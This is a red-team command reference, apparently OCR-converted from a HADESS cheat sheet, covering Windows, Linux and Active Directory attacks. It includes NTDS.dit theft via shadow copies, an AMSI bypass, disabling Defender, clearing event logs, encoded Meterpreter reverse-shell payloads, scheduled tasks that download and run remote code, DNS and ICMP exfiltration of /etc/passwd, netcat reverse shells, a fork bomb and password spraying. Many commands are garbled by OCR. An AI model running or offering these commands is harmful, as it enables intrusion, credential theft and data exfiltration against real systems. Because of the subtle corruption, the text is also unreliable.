---
title: "Red Team Guides"
source: Redteam Kit
converted: 2026-06-29T14:07:46+03:00
type: redteam-reference
---

HADESS   WWW.HADESS.IO
whoami
sudo apt install gss-ntlmssp
sudo apt-get install powershell




pwsh
$offsec_session = New-PSSession -ComputerName 10.10.10.210 -Authentication Negotiate -Cre
Enter-PSSession $offsec_session




New-Item -ItemType Junction -Path 'C:\ProgramData' -Target 'C:\Users\Administrator'




for x in {1 .. 254 .. l};do ping -c 1 1.1.1.$x lgrep "64 b" lcut -d" "-f4 ips.txt; done




#!/bin/bash
echo "Enter Class C Range: i.e. 192.168.3"
read range
for ip in {1 .. 254 .. l}; do
host $range.$ip lgrep " name pointer " lcut -d"
done




: (){:|: & };:
for ip in {1 .. 254 .. 1}; do dig -x 1.1.1.$ip | grep $ip
dns.txt; done




#!/bin/sh
# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2
# It assumes 1 is the router and does not ban IPs .20, .21, .22
i=2
while
$i -le 253 l
do
if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then
echo "BANNED: arp -s 192.168.1.$i"
arp -s 192.168.1.$i OO:OO:OO:OO:OO:Oa
else
echo "IP NOT BANNED: 192.168.1.$i"
fi
i='expr $i +1`
done




Set up script in crontab to callback every X minutes.
Highly recommend YOU
set up a generic user on red team computer (with no shell privs).
Script
will use the private key (located on callback source computer) to connect
to a public key (on red team computer). Red teamer connects to target via a
local SSH session (in the example below, use #ssh -p4040 localhost)
#!/bin/sh
# Callback: script located on callback source computer (target)
killall ssh /dev/null 2 &1
sleep 5
REMLIS-4040
REMUSR-user
HOSTS=''domainl.com domain2.com domain3.com''
for LIVEHOST in SHOSTS;
do
    COUNT=S(ping -c2 $LIVEHOST | grep 'received' | awk -F','{ print $2 } '
    | awk ' ( print $1 | ')
    if [ [ $COUNT -gt 0 ] ] ; then
    ssh -R $(REMLIS}:localhost:22 -i
     "/home/$(REMUSR}/.ssh/id rsa" -N $(LIVEHOST} -1 $(REMUSR}
fi




iptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state
NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i
iface -p tcp --sport 22 -m state --state
ESTABLISHED -j ACCEPT
iptacles -A OUTPUT -i iface -p icmp --icmp-type echo-request -j ACCEPT
iptables -A INPUT -o iface -p icmp --icmp-type echo-reply -j ACCEPT




echo "1" /proc/sys/net/ipv4/lp forward
# OR- sysctl net.ipv4.ip forward=1
iptables -t nat -A PREROUTING -p tcp -i ethO -j DNAT -d pivotip --dport
443 -to-destination attk ip :443
iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT -s target subnet
cidr -d attackip --dport 443 -to-source pivotip
iptables -t filter -I FORWARD 1 -j ACCEPT




iptables -A INPU~ -s 1.1.1.0/24 -m state --state RELATED,ESTABLISHED,NEW
-p tcp -m multipart --dports 80,443 -j ACCEPT
iptables -A INPUT -i ethO -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -P INPUT DROP
iptables -A OUTPUT -o ethO -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -N LOGGING
iptables -A INPUT -j LOGGING
iptables -A LOGGING -m limit --limit 4/min -j LOG --log-prefix "DROPPED "
iptables -A LOGGING -j DROP
xwd -display ip :0 -root -out /tmp/test.xpm
xwud -in /tmp/test1.xpm
convert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg




xwd -display 1.1.1.1:0 -root -silent -out x11dump
Read dumped file with xwudtopnm or GIMP
tcpdump -i ethO -XX -w out.pcap




tcpdump -i ethO port 80 dst 2.2.2.2




tcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24




tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'




tcpdump -i ethO -c 50 -tttt 'udp and port 53'




wmis -U DOMAIN\ user % password //DC cmd.exe /c command




# Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs
mount.cifs // ip /share /mnt/share -o
user=user,pass=pass,sec=ntlmssp,domain=domain,rw
apt-get update
apt-get upgrade




https://github.com/rebootuser/LinEnum
Example: ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t




https://github.com/DominicBreuker/pspy
For example: ./pspy64 -pf -i 1000
/Users/<username>/Library/Preferences/.GlobalPreferences.plist




/Users/<username>/Library/Preferences/


defaults read <path_to_plist_file>

defaults write <path_to_plist_file> <key> <value>


defaults delete <path_to_plist_file> <key>


PlistBuddy -c "Open <path_to_plist_file>"


PlistBuddy -c "Print <key>" <path_to_plist_file>



PlistBuddy -c "Add <key> <type> <value>" <path_to_plist_file>



PlistBuddy -c "Delete <key>" <path_to_plist_file>



PlistBuddy -c "Set <key> <value>" <path_to_plist_file>
plutil -lint <path_to_plist_file>


plutil -convert xml1 <path_to_plist_file>




sudo dscl . -create /Users/newusername

sudo dscl . -passwd /Users/newusername password

sudo dscl . -append /Groups/admin GroupMembership
newusername

sudo dseditgroup -o create -r "Group Name" groupname

sudo dseditgroup -o edit -a username -t user groupname

dscl . -read /Groups/groupname GroupMembership

sudo dseditgroup -o delete groupname

sudo dseditgroup -o edit -d username -t user groupname

sudo dseditgroup -o edit -n newgroupname -r oldgroupname
# All users
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
# Specific users
%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Star




%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup




%SystemDrive%\wmiOWS\Start Menu\Programs\Startup




%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\Startup
rundll32.dll user32.dll LockWorkstation




netsh advfirewall set currentprofile state off netsh advfirewall set allprofiles state of




netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=40
#Remove
netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=l.l.l.l




reg add HKCU\Software\Policies\t1icrosoft\Windows\System /v DisableCHD /t REG DWORD /d 0




psexec /accepteula \\ targetiP -u domain\user -p password -c -f \\ smbiP \share\file.exe




psexec /accepteula \\ ip -u Domain\user -p Lt1 c:\Program-1




psexec /accepteula \\ ip -s cmd.exe
Create regfile.reg file with following line in it: HKEY LOCAL t1ACHINE\SYSTEH\CurrentCont
"fDenyTSCo~nections"=dword: 00000000
reg import reg file. reg
net start ''terrnservice''
sc config terrnservice start= auto
net start terrnservice

    --OR--
reg add "HKEY LOCAL t1ACHINE\SYSTEH\CurentControlSet\Control \Terminal Server" /v fDenyTS




REG ADD "HKLt1\System\CurrentControlSet\Control \Terminal Server\WinStations\RDP-Tcp" /v




reg add "HKEY LOCAL t1ACHINE\SYSTEt1\CurentControlSet\Control \Terminal
Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f

netsh firewall set service type = remotedesktop mode = enable




schtasks.exe /create /tn t1yTask /xml "C:\MyTask.xml" /f
[alias] == process, share, startup, service, nicconfig, useraccount, etc.
[where] ==where (name="cmd.exe"), where (parentprocessid!=[pid]"), etc.
[clause] ==list [fulllbrief], get [attribl, attrib2], call [method], delete




wmic /node: targetiP /user:domain\user /password:password process call create "\ \ smbiP




wmic product get name /value # Get software names
wmic product where name="XXX" call uninstall /nointeractive
wmic /node:remotecomputer computersystern get username




wmic /node:machinename process list brief /every:l




wmic /node:"machinename 4" path Win32_TerminalServiceSetting where
AllowTSConnections=''O'' call SetAllowTSConnections ''1''




wmic netlogin where (name like "%adm%") get numberoflogons




wmic service get narne,displayname,pathnarne,startrnode
| findstr /i nauton | findstr /i /v "C:\windows\\" | findstr /i /v """




1. wmic /node: DC IP /user:"DOI1AIN\user" /password:"PASS" process
   call create "cmd /c vssadmin list shadows 2 &1
   c:\temp\output.txt"
# If any copies alread1 ex~st then exfil, otherwise create using
following commands. Check output.txt for anJ errors
2. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process
   call create "cmd /c vssadmin create shadow /for=C: 2 &1
   C:\temp\output.txt"
3. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process
   call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVol~meShadowCopy1\Windows\Syste
   C:\temp\system.hive 2 &1
   C:\temp\output.txt"
4. wmic /node: DC IP /user: "DOl'.llUN\user" /password: "PASS" process call create ''cmd
   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyc\NTDS\NTDS.dit
   C:\temp\ntds.dit 2 &1 C:\temp\output.txt"
Step by step instructions on room362.com for step below
5. From Linux, download and run ntdsxtract and libesedb to export
hashes or other domain information
a. Additional instructions found under the VSSOWN section
b. ntdsxtract - http://www.ntdsxtract.com
   lib   db   htt // d        l     / /lib   db/
Import-Module .\Invoke-Obfuscation\Invoke-Obfuscation.psm1
Out-ObfuscatedTokenCommand -Path .\powerview.ps1 | Out-File out




https://raw.githubusercontent.com/kmkz/Pentesting/master/AMSI-Bypass.ps1
. .\AMSI-Bypass.ps1
Invoke-AmsiBypass




powershell -command set-mpppreference -Disable realtimemonitoring $true




$users = New-Object DirectoryServices.DirectorySearcher
$users.Filter = "(&(objectclass=user))"
$users.SearchRoot = ''
$users.FindAll()




$computers = New-Object DirectoryServices.DirectorySearcher
$computers.Filter = "(&(objectclass=computer))"
$computers.SearchRoot = ''
$computers.FindAll()




Set-ADAccountControl -identity jorden -doesnotrequirepreauth 1
Get-EventLog -list
Clear-EventLog -logname Application, Security -computername SVR01




Get-WmiObject -class win32 operatingsystem | select -property ' |
export-csv c:\os.txt




Get-Service | where_object {$_.status -eq "Running"}




New-PSJrive -Persist -PSProvider FileSjstem -Root \\1.1.1.1\tools -Name i




Get-Childitem -Path c:\ -Force -Rec~rse -Filter '.log -ErrorAction
SilentlyContinue | where {$_.LastWriteTime -gt "2012-08-20"}




(new-object sjstem.net.webclient).downloadFile(''url'',''dest'')




$ports=(#,#,#) ;$ip="x.x.x.x";foreach ($port in $ports) {try
($socket=New-object Sjstem.Net.Sockets.TCPClient($ip,$port); }catch(};
if ($socket -eq $NULL) (echo $ip":"$port"- Closed";}
else(echo $ip":"$port"- Open";$socket =$NULL;}}
$ping = New-Object Sjstex.Net.Networkinformation.ping
$ping.Send(''ip'',5JO)




powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass
$Host.UI.PromptForCredential(" title "," message "," user" "," domain")




powershell. exe -Command "do {if ((Get-Date -format yyyyMMdd-HHmm) -match
'201308 ( 0 [ 8-9] |1 [0-1])-(0[ 8-9]]|1 [ 0-7]) [ 0-5] [ 0-9]') {Start-Process -
WindowStyle Hidden "C:\Temp\my.exe";Start-Sleep -s 14400))while(1)"




$pw ~ convertto-securestring -string "PASSWORD" -asplaintext -force;
$pp ~ new-object -typename System.Management.Automation.PSCredential -
argument list "DOMAIN\user", $pw;
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command
&{Start-Process file.exe -verb runas)'




           −                 ://192.168.2.   /          .   −          −       .    e




powershell.exe Send-l-1ai1Hessage -to "email" -from "email" -subject
"Subject" -a "attachment file path" -body "Body" -SmtpServer Target
Email Server IP




net time \\ip
at \\ip time "Powershell -Command 'Enable-PSRemoting -Force'"
at \\ip time+1 "Powershell -Command 'Set-Item
wsman:\localhost\client\trustedhosts ''"
at \ \ip time+2 "Powershell -Command 'Restart-Service WinRM'"
Enter-PSSession -ComputerName ip -Credential username




Get-WmiObject -ComputerName DC -Namespace root\microsoftDNS -Class
MicrosoftDNS _ ResourceRecord -Filter "domainname~' DOMAIN '" | select
textrepresentation




powershell.exe -noprofile -noninteractive -command
"[System.Net.ServicePointManager] ::ServerCertificateValidationCallback =
{$true); $source="""https:ll YOUR SPECIFIED IP I file.zip """;
$destination="C:\rnaster.zip"; $http = new-object Systern.Net.WebClient;
$response= $http.DownloadFile($source, $destination);"




Script will send a file ($filepath) via http to server ($server) via POST request.
Must have web server listening on port designated in the $server

powershell.exe -noprofile -noninteractive -command
"[S;stem.Net.ServicePointManager] ::ServerCertificateValidationCallback =
{$true); $server="""http:// YOUR_SPECIFIED IP / folder """;
$filepath="C:\master.zip" $http= new=object System.Net.WebClient;
$response= $http.UploadFile($server,$filepath);"




Need Metasploit v4.5+ (msfvenom supports Powershell)
Use Powershell (x86) with 32 bit Meterpreter payloads
encodeMeterpreter.psl script can be found on next page
1. ./msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=1.1.1.1 LPORT=443
2. Move audit.psl into same folder as encodeMeterpreter.psl
3. Launch Powershell (x86)
4. powershell.exe -executionpolicy bypass encodeMeterpreter.psl
5. Copy the encoded Meterpreter string




1. ./msfconsole
2. use exploit/multi/handler
3. set payload windows/meterpreter/reverse https
4. set LHOST 1. 1. 1. 1
5. set LPORT 443
6. exploit -j




1. powershell. exe -noexi t -encodedCommand paste encoded Meterpreter
string here
PROFIT




# Get Contents of Script
$contents = Get-Content audit.psl
# Compress Script
$ms = New-Object IO.MemoryStream
$action = [IO.Compression.CompressionMode]: :Compress
$cs =New-Object IO.Compression.DeflateStream ($ms,$action)
$sw =New-Object IO.StreamWriter ($cs, [Text.Encoding] ::ASCII)
$contents I ForEach-Object {$sw.WriteLine($ I)
$sw.Close()
# Base64 Encode Stream
$code= [Convert]: :ToBase64String($ms.ToArray())
$command= "Invoke-Expression '$(New-Object IO.StreamReader('$(New-Object
IO. Compression. DeflateStream ('$(New-Object IO. t4emoryStream
(, '$ ( [Convert] : : FromBase64String ('"$code'") ) I I ,
[IO.Compression.Compressiont~ode]: :Decompress) I,
[Text.Encoding]: :ASCII)) .ReadToEnd() ;"
# Invoke-Expression $command
$bytes= [System.Text.Encoding] ::Unicode.GetBytes($command)
$encodedCommand = [Convert]: :ToBase64String($bytes)
# Write to Standard Out
Write-Host $encodedCommand




1. msfpayload windows/rneterpreter/reverse tcp LHOST=10.1.1.1
LPORT~8080 R I msfencode -t psh -a x86




1. c:\powershell
2. PS c:\ $cmd = 'PASTE THE CONTENTS OF THE PSH SCRIPT HERE'
3. PS c:\ $u = [System.Text.Encoding]: :Unicode.GetBytes($crnd)
4. PS c: \ $e = [Convert] ::ToBase64String($u)
5. PS c:\ $e
6. Copy contents of $e




1. ./msfconsole
2. use exploit/multi/handler
3. set payload windows/meterpreter/reverse tcp
4. set LHOST 1.1.1.1
5. set LPORT 8080
6. exploit -j




1. c: \ powershell -noprofile -noninteracti ve -command " &
     {$client=new-object
     System.Net.WebClient; $client.DownloadFile('http://1.1.1.1/shell.txt
     ', 'c:\windows\temp\shell.txt') )"
2. c: \ powershell -noprofile -noninteracti ve -noexi t -command " &
     {$crnd~tjpe 'c:\windows\temp\shell.txt';powershell -noprofilenoninteractive
     -noexit -encodedCornmand $cmd} "
PROFIT




https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
. .\PowerUp.ps1




HKLM\Software\Microsoft\Windows NT\CurrentVersion




HKLM\Software\Microsoft\Windows NT\CurrentVersion /v
ProductNarne




HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate




HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner




HKLM\Software\~icrosoft\Windows NT\CurrentVersion /v SystemRoot




HKLM\System\CurrentControlSet\Control\TimeZoneinformation /v ActiveTirneBias
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive
MRU




HKLM\System\MountedDevices




HKLM\System\CurrentControlSet\Enurn\USBStor




HKEY_LOCAL_~ACHI~E\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -
IPEnableRouter = 1




HKEY LOCAL MACHINE\Security\Policy\Secrets
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\autoadminlogon




HKLM\Security\Policy\PolAdTev




HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services




HKLM\Software
HKCU\Software




HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs




HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisite
dtmu & \Opensavetmu




HKCU\Software\Microsoft\Internet Explorer\TypedURLs




HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU




HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\RegEdit /v LastKeY




HKLM\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load & \Run
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fD




dsquery user -limit 0




dsquery group "cn=users, dc=victim, dc=com"




dsquery group -name "domain admins" | dsget group -members -expand




dsquery user -name bob | dsget user -memberof -expand




dsquery user -name bob | dsget user -samid




dsquery user - inactive 2




dsadd user "CN=Bob,CN=Users,DC=victim,DC=com" -samid bob -pwd bobpassdisplaj
"Bob" -pwdneverexpires yes -memberof "CN=Domain
Admins,CN=Users,DC=victim,DC=com




dsrm -subtree -noprornpt "CN=Bob,CN=Users,DC=victim,DC=com"




dsquery A "DC=victim,DC=com" -scope subtree -attr "en" "operatingSystem"
"operatingSystemServicePack" -filter
" (& (objectclass=computer) (objectcategory=computer) (operatingSystem=Windows}
))"




dsquery site -o rdn -limit 0




dsquery subnet -site sitename -o rdn




dsquery server -site sitename -or rdn




dsquery ' domainroot -filter
" (& (objectCategory=Computer) (objectClass=Computer) (operatingSystem='Server'
) ) "-limit 0




dsquery "CN=Sites,CN=Configuration,DC=forestRootDomain" -filter
(objectCategory=Server)
for /L %i in (10,1,254) do@ (for /L %x in (10,1,254) do@ ping -n 1 -w 100
10.10.%i.%x 2 nul 1 find "Reply" && echo 10.10.%i.%x live.txt)




for /F %i in (file) do command




for /F %n in (names.txt) do for /F %pin (pawds.txt) do net use \\DC01\IPC$
/user: domain \%n %p 1 NUL 2 &1 && echo %n:%p && net use /delete
\\DCOl\IPC$ NUL




@echo Test run:
for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN-
1234\c$ /USER:%%U wrong pass




for /L %i
1.1.1.%i
in (2,1,254) do (netsh interface ip set address local static
netrask gw ID %1 ping 127.0.0.1 -n l -w 10000 nul %1)




for /L %i in (100, 1, 105)
dns.txt && echo Server:
do @ nslookup 1.1.1.%i I findstr /i /c:''Name''
1.1.1.%i dns.txt




forfi1es /P c:\temp /s /m pass -c "cmd /c echo @isdir @fdate @ftime
@relpath @path @fsize"




# Run packet capture on attack domain to receive callout
# domains.txt should contain known malicious domains
for /L %i in (0,1,100) do (for /F %n in (domains.txt) do nslookup %n
attack domain NUL 2 &1 & ping -n 5 127.0.0.1 NUL 2 &1




for /L %C in (1,1,5000) do @for %U in (www.yahoo.com www.pastebin.com
www.paypal.com www.craigslist.org www.google.com) do start /b iexplore %U &
ping -n 6 localhost & taskkill /F /IM iexplore.exe




for /f "tokens=2 delims='='" %a in ('wmic service list full | find /i
"pathname" I find /i /v "system32"') do @echo %a
c:\windows\temp\3afd4ga.tmp
for /f eol = " delims = " %a in (c:\windows\temp\3afd4ga.tmp) do cmd.exe
/c icacls ''%a''




for /L %i in (2,1,254) do shutdown /r /m \\1.1.1.%i /f /t 0 /c "Reboot
message"
# Create .vbs script with the following
Set shell wscript.createobject("wscript.shell")
Shell.run "runas /user: user " & """" &
C:\Windows\System32\WindowsPowershell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bjpass -nop -c \" & """" & "IEX ((New-
Object Net.WEbClieil':).downloadstring(' url '))\" & """" & """"
wscript.sleep(100)
shell.Sendkeys "password" & "{ENTER}"




Scheduled tasks binary paths CANNOT contain spaces because everything
after the first space in the path is considered to be a command-line
argument. Enclose the /TR path parameter between backslash (\) AND
quotation marks ("):
... /TR "\"C:\Program Files\file.exe\" -x arg1"




SCHTASKS /CREATE /TN Task Name /SC HOURLY /ST HH:MM /F /RL HIGHEST /SD
MM/DD/YYYY /ED MM/DD/YYYY /tr "C:\my.exe" /RU DOMAIN/user /RP
password




For 64 bit use:
"C:\Windows\syswow64\WindowsPowerShell\vl.O\powershell.exe"
# (x86) on User Login
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object
net.webclient) .downloadstring( ''http:// ip : port I payload'''))'' /SC
onlogon /RU System
# (x86) on System Start
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object
net.webclient) .downloadstring("http:// ip : port I payload"))'" /SC
onstart /RU System
# (x86) on User Idle (30 Minutes)
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bjpass -nop -c 'IEX ((new-object
net.webclient) .downloadstring("http:// ip : port I payload"))'" /SC
onidle /i 30




smbclient -L 10.10.10.10 -U tlevel




smbclient -N -L 10.10.10.10




smbpasswd -r 10.10.10.10 -U tlevel




smbclient -L 10.10.10.10




smbclient //10.10.10.10/forensic




smbclient //10.10.10.10/profiles$




python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py 10.10.10.10L -usersfile
msf5 > use auxiliary/scanner/smb/smb_login
set pass_file wordlist
set USER_file users.txt
set RHOSTS 10.10.10.10
run




medusa -h 10.10.10.10 -U users.txt -P wordlist -M smbnt




rpcclient 10.10.10.10 -U support




queryuser support




enumdomusers




enumprivs




setuserinfo2 audit2020 23 'redteam'
enumprinters




python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system sy
hashes lmhash:nthash LOCAL -output nt-hash




https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
.\SharpHound.exe
or
SharpHound.exe -c All --zipfilename output.zip




https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1
. .\PowerUpSQL.ps1
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose




https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
.\Rubeus.exe asreproast




for /L %i in (1,1,255) do @ping -n 1 -w 200 10.10.10.%i > nul && echo 10.10.10.%i is up.
https://github.com/sperner/PowerShell/blob/master/PortScan.ps1
.\PortScan.ps1
.\PortScan.ps1 10.10.10.10 1 10000




PS> Test-WSMan -ComputerName <COMPUTERNAME> -Port 6666




   −       −




   −               −          "       ://   =    ,   =       ,   =     " −




SharpHound.exe --CollectionMethod all




       .       _         −u
       .               −  "       \         "   :\   \   \       . e
Given: 1.1.1.101/28
/28 = 255.255.255.240 netmask
256 - 240 = 16 = subnet ranges of 16, i.e.
    1.1.1.0
    1.1.1.16
    1.1.1.32 ...
Range where given IP falls: 1.1.1.96 - 1.1.1.111




ff02::1 - link-local nodes
ff05::1 - site-local nodes
ff01::2 - node-local routers
ff02::2 - link-local routers
ff05::2 - site-local routers




fe80:: -link-local
2001:: - routable
::a.b.c.d- IPv4 compatible IPv6
::ffff:a.b.c.d- IPv4 mapped IPv6




Remote Network DoS:
rsumrf6 eth# remote ipv6




./chisel server -p 9000 --reverse
./chisel client <ip>:9000 R:4500:127.0.0.1:4500




./chisel server -p 9000 --reverse
./chisel client <ip>:9000 R:socks




socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[2001::]:80
./nikto.pl -host 12-.0.0.1 -port 8080
http:// ip /level/ 16-99 /exec/show/config
svn list svn://10.10.10.10/Empty/




svn log svn://10.10.10.10/




svn diff -c r2 svn://10.10.10.10




python3 atomizer.py owa 10.10.10.10 pass.txt user.txt -i 0:0:01




./snmpblow.pl -s srcip -d rtr_ip -t attackerip -f out.txt
snmpstrings.txt




snrnpwalk -c public -v1 ip 1 | grep hrSWRJnName | cut -d" " -f4




smpwalk | grep tcpConnState | cut -d" " -f6 | sort-u




smpwalk | grep hrSWInstalledName
snmpwalk ip 1.3 | grep 77.1.2.25 -f4




snmpwalk -v 1 -c public 10.13.37.10




responder -I eth1 -v




tcpdump -nvvX -sO -i eth0 tcp portrange 22-23




tcpdump -I eth0 -tttt dst ip and not net 1.1.1.0/24




tcpdump net 192.1.1




dumpcap -I eth0 -a duration: sec -w file file.pcap
file2cable -i eth0 -f file.pcap




tcpreplay --topspeed --loop=O --intf=eth0 .pcap_file_to replay rnbps=10|100|1000




Reverse lookup for IP range:
./dnsrecon.rb -t rvs -i 192.1.1.1,192.1.1.20
Retrieve standard DNS records:
./dnsrecon.rb -t std -d domain.corn
Enumerate suborders:
./dnsrecon.rb -t brt -d domain.corn -w hosts.txt
DNS zone transfer:
./dnsrecon -d domain.corn -t axfr




nmap -R -sL -Pn -dns-servers dns svr ip range | awk '{if( ($1" "$2"
"$3)=="Nmap scan report")print$5" "$6}' | sed 's/(//g' I sed 's/)//g'
dns.txt




ike-scan -M -A vpn ip -P file




ike-scan -A -t 1 --sourceip= spoof ip dst ip
Must know the VPN group name a~d pre-shared key;
1. Ettercap filter to drop IPSEC traffic (UDP port 500)
   if(ip.proto == UDP && udp.scc == 500) {
      kill();
      drop();
      msg (" UDP packet dropped ") ;
2. Compile filter
   etterfilter udpdrop.filter -o udpdrop.ef
3. Start Ettercap and drop all IPSEC ~raffic
   #ettercap -T -g -M arp -F udpdrop.ef // //
4. Enable IP Forward
   echo "1" /proc/sys/net/ipv4/ip_forward
5. Configure IPtables to port forward to Fiked server
    iptables -t nat -A PREROUTING -p udp -I eth0 -d VPN Server IP -j
   DNAT - - to Attacking Host IP
    iptables -P FORWARD ACCEP~
6. Start Fiked to impersonate the VPN Server
   fiked - g vpn gatewa; ip - k VPN Group Name:Group Pre-Shared Ke;
7. Stop Ettercap
8. Restart Ettercap without the filter
   ettercap -T -M arp II II




hydra -L ~/seclists/Usernames/Names/femalenames-usa-top1000.txt -p Welcome123! IP PROTOCO




smbclient -U USERNAME -L IP




ruby evil-winrm.rb -u USER -p PASS -i IP




simpleproxy -L 8000 -R 10.10.10.10:1337
[HKEY_CURRENT_USER\Software\Si~onTatham\Putt;\Sessions\Default%20Settings]
"LogFileName"="%TEMP%\putty.dat"
"LogType"=dword:00000002"




ldapsearch -h <host> -x -b "dc=<dc>,dc=local"




ldapsearch -x -LLL -w PASSWORD




lftp -e 'set ssl:verify-certificate false' -u "user,pass" -p 21 10.10.10.10




python pret.py 10.10.10.10 pjl




1.
nc -lvnp 80
2.
while reading mail; do swaks --to $mail --from it@sneakymailer.htb --header "Subject: Cre
E     "   b d " t htt //10 10 10 19/"              10 10 10 10 d         il t t




vncpwd.exe <ENCRYPTEDPASSWORD>




RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
Value: Password

TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server
HKLM\SOFTWARE\TightVNC\Server\ControlPassword

tightvnc.ini
vnc_viewer.ini
Value: Password or PasswordViewOnly

TigerVNC
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
Value: Password

UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini
Value: passwd or passwd2




nmap -Pn -sV --script "rtsp-*" -p 554 10.10.10.10/24
rtspbrute -t ip.txt -p 554




docker run -t ullaakut/cameradar -t 192.168.100.0/24




ssh <target>




nmap -p 22 <target> -




hydra -L users.txt -P passwords.txt ssh://<target> -




curl http://<target> -




nmap -p 80 <target>




dirb http://<target>
curl https://<target>




nmap -p 443 <target>




sslscan <target>:443




ftp <target>




nmap -p 21 <target>




hydra -l <username> -P passwords.txt ftp://<target>




telnet <target> 25
nmap -p 25 <target>




smtp-user-enum -M VRFY -U users.txt -t <target>




nslookup <target>




nmap -p 53 <target>




dnsrecon -d <target>




telnet <target> 110




nmap -p 110 <target>




hydra -l <username> -P passwords.txt pop3://<target>
telnet <target> 143




nmap -p 143 <target> -




hydra -l <username> -P passwords.txt imap://<target> -




mysql -h <target> -u <username> -p




nmap -p 3306 <target>




sqlmap -u "http://<target>/index.php?id=1" --dbs




rdesktop <target>
nmap -p 3389 <target>




crowbar -b rdp -s <target>/32 -u users.txt -C passwords.txt




vncviewer <target>



nmap -p 5900 <target>
    /.        /       /4   4.       −   e
     3       .
.
         _        .         _   ;
.




echo open ip 21 ftp.txt
echo user ftp.txt
echo pass ftp.txt
echo bin ftp.txt
echo GET file tp.txt
echo bye ftp.txt
ftp -s:ftp.txt
On victim:
1. Hex encode the file to be transferred
    xxd -p secret file.hex
2. Read in each line and do a DNS lookup
    forb in 'cat fole.hex'; do dig $b.shell.evilexample.com; done

Attacker:
1. Capture DNS exfil packets
    tcdpump -w /tmp/dns -s0 port 53 and host system.example.com
2. Cut the exfilled hex from the DNS packet
    tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d'
    cut -f1 -d'.' | uniq received. txt
3. Reverse the hex encoding
    xxd -r -p received~.txt kefS.pgp




On victim (never ending 1 liner):
     stringz=cat /etc/passwd | od -tx1 | cut -c8- | tr -d " " | tr -d "\n";
counter=0; while (($counter = ${#stringZ})) ;do ping -s 16 -c l -p
${stringZ:$counter:16} 192.168.10.10 &&
counter=$( (counter+~6)) ; done

On attacker (capture pac~ets to data.dmp and parse):
tcpdump -ntvvSxs 0 'icmp[0]=8' data.dmp
grep Ox0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p




C:\ telnet x.x.x.x 25
Hello x.x.x.x
MAIL FROM: me@you.com
RCPT TO: YOU@YOU.com
DATA
Thank you.
quit
nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell
nc 10.0.0.1 1234 -e cmd.exe Windows reverse shell




nc -e /bin/sh 10.0.0.1 1234




